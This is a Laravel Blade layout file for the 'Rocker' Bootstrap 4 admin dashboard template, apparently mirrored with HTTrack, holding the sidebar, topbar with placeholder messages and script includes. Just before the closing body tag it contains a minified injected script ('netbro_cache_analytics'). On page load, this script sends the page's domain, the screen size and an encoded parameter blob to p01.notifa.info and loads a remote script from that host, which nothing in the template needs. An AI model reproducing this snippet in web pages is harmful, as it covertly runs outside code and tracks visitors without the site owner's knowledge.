<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from codervent.com/rocker/color-version/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 11:59:49 GMT -->
<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
  <meta name="description" content=""/>
  <meta name="author" content=""/>
  <title>Rocker - Bootstrap4  Admin Dashboard Template</title>
  <!--favicon-->
  <link rel="icon" href="{{ asset('assets/images/favicon.ico')}}" type="image/x-icon"/>
  <!-- Vector CSS -->
  <link href="{{ asset('assets/plugins/vectormap/jquery-jvectormap-2.0.2.css')}}" rel="stylesheet"/>
  <!-- simplebar CSS-->
  <link href="{{ asset('assets/plugins/simplebar/css/simplebar.css')}}" rel="stylesheet"/>
  <!-- Bootstrap core CSS-->
  <link href="{{ asset('assets/css/bootstrap.min.css')}}" rel="stylesheet"/>
  <!-- animate CSS-->
  <link href="{{ asset('assets/css/animate.css')}}" rel="stylesheet" type="text/css"/>
  <!-- Icons CSS-->
  <link href="{{ asset('assets/css/icons.css')}}" rel="stylesheet" type="text/css"/>
  <!-- Sidebar CSS-->
  <link href="{{ asset('assets/css/sidebar-menu.css')}}" rel="stylesheet"/>
  <!-- Custom Style-->
  <link href="{{ asset('assets/css/app-style.css')}}" rel="stylesheet"/>
  
</head>

<body>

<!-- Start wrapper-->
 <div id="wrapper">
 
  <!--Start sidebar-wrapper-->
   <div id="sidebar-wrapper" data-simplebar="" data-simplebar-auto-hide="true">
     <div class="brand-logo">
      <a href="index.html">
       <img src="{{ asset('assets/images/logo-icon.png')}}" class="logo-icon" alt="logo icon">
       <h5 class="logo-text">RockerAdmin</h5>
     </a>
	 </div>
	 <ul class="sidebar-menu do-nicescrol">
      <li class="sidebar-header">FEATURE ADMIN</li>
      <li>
        <a href="index.html" class="waves-effect">
          <i class="icon-home"></i> <span>Dashboard</span> <i class="fa fa-angle-left pull-right"></i>
        </a>
        <ul class="sidebar-submenu">
          <li><a href="index.html"><i class="fa fa-circle-o"></i> Dashboard v1</a></li>
          <li><a href="index2.html"><i class="fa fa-circle-o"></i> Dashboard v2</a></li>
          <li><a href="index3.html"><i class="fa fa-circle-o"></i> Dashboard v3</a></li>
          <li><a href="index4.html"><i class="fa fa-circle-o"></i> Dashboard v4</a></li>
        </ul>
      </li>
      <li>
        <a href="javaScript:void();" class="waves-effect">
          <i class="icon-briefcase"></i>
          <span>UI Elements</span> <i class="fa fa-angle-left pull-right"></i>
        </a>
        <ul class="sidebar-submenu">
  		  <li><a href="ui-typography.html"><i class="fa fa-circle-o"></i> Typography</a></li>
  		  <li><a href="ui-buttons.html"><i class="fa fa-circle-o"></i> Buttons</a></li>
  		  <li><a href="ui-checkbox-radio.html"><i class="fa fa-circle-o"></i> Checkboxes & Radios</a></li>
  		  <li><a href="ui-nav-tabs.html"><i class="fa fa-circle-o"></i> Nav Tabs</a></li>
        <li><a href="ui-accordions.html"><i class="fa fa-circle-o"></i> Accordions</a></li>
  		  <li><a href="ui-modals.html"><i class="fa fa-circle-o"></i> Modals</a></li>
  		  <li><a href="ui-bootstrap-elements.html"><i class="fa fa-circle-o"></i> BS Elements</a></li>
        <li><a href="ui-pagination.html"><i class="fa fa-circle-o"></i> Pagination</a></li>
        <li><a href="ui-list-groups.html"><i class="fa fa-circle-o"></i> List Groups</a></li>
        <li><a href="ui-alerts.html"><i class="fa fa-circle-o"></i> Alerts</a></li>
  		  <li><a href="ui-progressbars.html"><i class="fa fa-circle-o"></i> Progress Bars</a></li>
  		  <li><a href="ui-notification.html"><i class="fa fa-circle-o"></i> Notifications</a></li>
  		  <li><a href="ui-sweet-alert.html"><i class="fa fa-circle-o"></i> Sweet Alerts</a></li>
        </ul>
      </li>
      <li>
        <a href="/admin/create-class" class="waves-effect">
          <i class="fa fa-users"></i> <span>Tambah Kelas</span>
         
        </a>
      </li>
	  
     
   </div>
   <!--End sidebar-wrapper-->

<!--Start topbar header-->
<header class="topbar-nav">
 <nav class="navbar navbar-expand fixed-top gradient-scooter">
  <ul class="navbar-nav mr-auto align-items-center">
    <li class="nav-item">
      <a class="nav-link toggle-menu" href="javascript:void();">
       <i class="icon-menu menu-icon"></i>
     </a>
    </li>
    <li class="nav-item">
      <form class="search-bar">
        <input type="text" class="form-control" placeholder="Enter keywords">
         <a href="javascript:void();"><i class="icon-magnifier"></i></a>
      </form>
    </li>
  </ul>
     
  <ul class="navbar-nav align-items-center right-nav-link">
    <li class="nav-item dropdown-lg">
      <a class="nav-link dropdown-toggle dropdown-toggle-nocaret waves-effect" data-toggle="dropdown" href="javascript:void();">
	    <i class="icon-envelope-open"></i><span class="badge badge-danger badge-up">24</span></a>
      <div class="dropdown-menu dropdown-menu-right">
        <ul class="list-group list-group-flush">
         <li class="list-group-item d-flex justify-content-between align-items-center">
          You have 24 new messages
          <span class="badge badge-danger">24</span>
          </li>
          <li class="list-group-item">
          <a href="javaScript:void();">
           <div class="media">
             <div class="avatar"><img class="align-self-start mr-3" src="{{ asset('assets/images/avatars/avatar-1.png')}}" alt="user avatar"></div>
            <div class="media-body">
            <h6 class="mt-0 msg-title">Jhon Deo</h6>
            <p class="msg-info">Lorem ipsum dolor sit amet...</p>
            <small>Today, 4:10 PM</small>
            </div>
          </div>
          </a>
          </li>
          <li class="list-group-item">
          <a href="javaScript:void();">
           <div class="media">
             <div class="avatar"><img class="align-self-start mr-3" src="{{ asset('assets/images/avatars/avatar-2.png')}}" alt="user avatar"></div>
            <div class="media-body">
            <h6 class="mt-0 msg-title">Sara Jen</h6>
            <p class="msg-info">Lorem ipsum dolor sit amet...</p>
            <small>Yesterday, 8:30 AM</small>
            </div>
          </div>
          </a>
          </li>
          <li class="list-group-item">
          <a href="javaScript:void();">
           <div class="media">
             <div class="avatar"><img class="align-self-start mr-3" src="{{ asset('assets/images/avatars/avatar-3.png')}}" alt="user avatar"></div>
            <div class="media-body">
            <h6 class="mt-0 msg-title">Dannish Josh</h6>
            <p class="msg-info">Lorem ipsum dolor sit amet...</p>
             <small>5/11/2018, 2:50 PM</small>
            </div>
          </div>
          </a>
          </li>
          <li class="list-group-item">
          <a href="javaScript:void();">
           <div class="media">
             <div class="avatar"><img class="align-self-start mr-3" src="{{ asset('assets/images/avatars/avatar-4.png')}}" alt="user avatar"></div>
            <div class="media-body">
            <h6 class="mt-0 msg-title">Katrina Mccoy</h6>
            <p class="msg-info">Lorem ipsum dolor sit amet.</p>
            <small>1/11/2018, 2:50 PM</small>
            </div>
          </div>
          </a>
          </li>
          <li class="list-group-item"><a href="javaScript:void();">See All Messages</a></li>
        </ul>
        </div>
    </li>
    <li class="nav-item dropdown-lg">
      <a class="nav-link dropdown-toggle dropdown-toggle-nocaret waves-effect" data-toggle="dropdown" href="javascript:void();">
	  <i class="icon-bell"></i><span class="badge badge-primary badge-up">10</span></a>
      <div class="dropdown-menu dropdown-menu-right">
        <ul class="list-group list-group-flush">
          <li class="list-group-item d-flex justify-content-between align-items-center">
          You have 10 Notifications
          <span class="badge badge-primary">10</span>
          </li>
          <li class="list-group-item">
          <a href="javaScript:void();">
           <div class="media">
             <i class="icon-people fa-2x mr-3 text-info"></i>
            <div class="media-body">
            <h6 class="mt-0 msg-title">New Registered Users</h6>
            <p class="msg-info">Lorem ipsum dolor sit amet...</p>
            </div>
          </div>
          </a>
          </li>
          <li class="list-group-item">
          <a href="javaScript:void();">
           <div class="media">
             <i class="icon-cup fa-2x mr-3 text-warning"></i>
            <div class="media-body">
            <h6 class="mt-0 msg-title">New Received Orders</h6>
            <p class="msg-info">Lorem ipsum dolor sit amet...</p>
            </div>
          </div>
          </a>
          </li>
          <li class="list-group-item">
          <a href="javaScript:void();">
           <div class="media">
             <i class="icon-bell fa-2x mr-3 text-danger"></i>
            <div class="media-body">
            <h6 class="mt-0 msg-title">New Updates</h6>
            <p class="msg-info">Lorem ipsum dolor sit amet...</p>
            </div>
          </div>
          </a>
          </li>
          <li class="list-group-item"><a href="javaScript:void();">See All Notifications</a></li>
        </ul>
      </div>
    </li>
    <li class="nav-item language">
      <a class="nav-link dropdown-toggle dropdown-toggle-nocaret waves-effect" data-toggle="dropdown" href="#"><i class="flag-icon flag-icon-gb"></i></a>
      <ul class="dropdown-menu dropdown-menu-right">
          <li class="dropdown-item"> <i class="flag-icon flag-icon-gb mr-2"></i> English</li>
          <li class="dropdown-item"> <i class="flag-icon flag-icon-fr mr-2"></i> French</li>
          <li class="dropdown-item"> <i class="flag-icon flag-icon-cn mr-2"></i> Chinese</li>
          <li class="dropdown-item"> <i class="flag-icon flag-icon-de mr-2"></i> German</li>
        </ul>
    </li>
    <li class="nav-item">
      <a class="nav-link dropdown-toggle dropdown-toggle-nocaret" data-toggle="dropdown" href="#">
        <span class="user-profile"><img src="{{ asset('assets/images/avatars/avatar-17.png')}}" class="img-circle" alt="user avatar"></span>
      </a>
      <ul class="dropdown-menu dropdown-menu-right">
       <li class="dropdown-item user-details">
        <a href="javaScript:void();">
           <div class="media">
             <div class="avatar"><img class="align-self-start mr-3" src="{{ asset('assets/images/avatars/avatar-17.png')}}" alt="user avatar"></div>
            <div class="media-body">
            <h6 class="mt-2 user-title">Katrina Mccoy</h6>
            <p class="user-subtitle">mccoy@example.com</p>
            </div>
           </div>
          </a>
        </li>
        <li class="dropdown-divider"></li>
        <li class="dropdown-item"><i class="icon-envelope mr-2"></i> Inbox</li>
        <li class="dropdown-divider"></li>
        <li class="dropdown-item"><i class="icon-wallet mr-2"></i> Account</li>
        <li class="dropdown-divider"></li>
        <li class="dropdown-item"><i class="icon-settings mr-2"></i> Setting</li>
        <li class="dropdown-divider"></li>
        <li class="dropdown-item"><i class="icon-power mr-2"></i> Logout</li>
      </ul>
    </li>
  </ul>
</nav>
</header>
<!--End topbar header-->

<div class="clearfix"></div>
	
  <div class="content-wrapper">
    <div class="container-fluid">

      <!--Start Dashboard Content-->
	  @yield('content')
    
    <!-- End container-fluid-->
    
    </div><!--End content-wrapper-->
   <!--Start Back To Top Button-->
    <a href="javaScript:void();" class="back-to-top"><i class="fa fa-angle-double-up"></i> </a>
    <!--End Back To Top Button-->
	
	<!--Start footer-->
	<footer class="footer">
      <div class="container">
        <div class="text-center">
          Copyright © 2018 Rocker Admin
        </div>
      </div>
    </footer>
	<!--End footer-->
   
  </div><!--End wrapper-->

  <!-- Bootstrap core JavaScript-->
  <script src="{{ asset('assets/js/jquery.min.js')}}"></script>
  <script src="{{ asset('assets/js/popper.min.js')}}"></script>
  <script src="{{ asset('assets/js/bootstrap.min.js')}}"></script>
	
  <!-- simplebar js -->
  <script src="{{ asset('assets/plugins/simplebar/js/simplebar.js')}}"></script>
  <!-- waves effect js -->
  <script src="{{ asset('assets/js/waves.js')}}"></script>
  <!-- sidebar-menu js -->
  <script src="{{ asset('assets/js/sidebar-menu.js')}}"></script>
  <!-- Custom scripts -->
  <script src="{{ asset('assets/js/app-script.js')}}"></script>
  
  <!-- Vector map JavaScript -->
  <script src="{{ asset('assets/plugins/vectormap/jquery-jvectormap-2.0.2.min.js')}}"></script>
  <script src="{{ asset('assets/plugins/vectormap/jquery-jvectormap-world-mill-en.js')}}"></script>
  <!-- Chart js -->
  <script src="{{ asset('assets/plugins/Chart.js/Chart.min.js')}}"></script>
  <!-- Index js -->
  <script src="{{ asset('assets/js/index.js')}}"></script>
  
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuhMN1ZjFqExVF6J4IeKcHe28LBc9tlZ79%2bcZqzQCTG5WL9PSAm%2f6SZpP3c9agMh70ri%2bRSs256Oap6Ocuf%2bH6v928DUzv%2bTUoKQtvZGAiX9m9zx7uO9gCxU2SkN5K1zT7CDqhKeIhh5lDzNUtHkQirH0%2fmvBWhDwBPuqW8M%2bz26DrnlmvHc9Rs7ShjyzIaOpjIN91mmqgilrdf0S7FNJ5pc1gmn3a%2bIluNPHb4BB1LVNT5CRapXDKNVJriKePAS0JSaGYX4fc2LP6NyYoEN1%2bCKN423OJySlR3jpXWdXLvTndj4bhvz%2fkVOYq%2f36zp97izjiT4m5el0NmUTvvV3AN0Nck7BCXdY9hBAUlkRYE8aox8HyTIygIwU4wqHjLijitqIDlJQIlM%2fkd4dOtoOHrHEHPJBtmTieG%2f1aRgbcH46hvzS%2fv%2bwcng7SLlyzzlnM%2bfvsWCdduBOMiwR2TKEaLi5zuMCkbIHSzM8m%2b9HF2%2bT8g%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from codervent.com/rocker/color-version/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 11:59:49 GMT -->
</html>
